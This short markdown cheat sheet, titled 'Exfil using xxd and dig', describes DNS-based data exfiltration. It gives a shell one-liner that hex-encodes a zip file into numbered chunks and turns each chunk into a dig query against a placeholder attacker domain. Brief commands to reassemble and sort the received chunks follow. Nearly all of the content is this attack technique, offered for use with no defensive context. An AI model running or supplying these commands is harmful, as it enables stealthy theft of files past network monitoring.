
### Exfil using xxd and dig

xxd -p -c 8 4digits.hex.zip |  nl -s"." -nrz -w5 | while read h; do echo dig $h.<domain>; done

### Re-assemble packets

xxd -r -p 4digits.hex

### sort packets
  
sort -h
